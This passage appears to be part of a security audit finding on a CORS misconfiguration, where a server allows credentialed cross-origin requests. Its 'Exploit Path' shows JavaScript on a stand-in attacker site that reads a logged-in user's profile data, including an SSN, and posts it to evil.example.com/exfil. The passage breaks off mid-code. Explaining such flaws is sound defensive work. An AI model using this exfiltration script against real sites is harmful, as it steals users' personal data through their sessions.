res.header('Access-Control-Allow-Credentials', 'true');           // line 7 — allows cookies/session
```

**Exploit Path:**

An attacker hosts `https://evil.example.com` with the following script:

```javascript
fetch('http://target:3000/api/profile', { credentials: 'include' })
  .then(r => r.json())
  .then(data => {
    // data contains { user: {...}, ssn: "..." }
    fetch('https://evil.example.com/exfil', {
      method: 'POST',
      body: JSON.stringify(data)
